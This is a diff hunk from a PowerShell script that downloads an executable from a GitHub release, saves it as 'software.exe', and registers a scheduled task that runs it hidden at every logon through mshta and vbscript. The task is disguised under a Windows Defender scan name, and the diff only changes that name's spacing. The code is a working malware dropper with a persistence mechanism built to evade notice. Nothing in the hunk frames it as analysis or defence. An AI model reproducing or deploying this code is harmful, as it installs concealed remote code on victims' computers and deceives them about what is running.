@@ -14,7 +14,7 @@ $url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/s
 $output = "$dir\software.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 
-$task_name = "Windows defender auto scan"
+$task_name = "Windowsdefenderautoscan"
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"$output`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
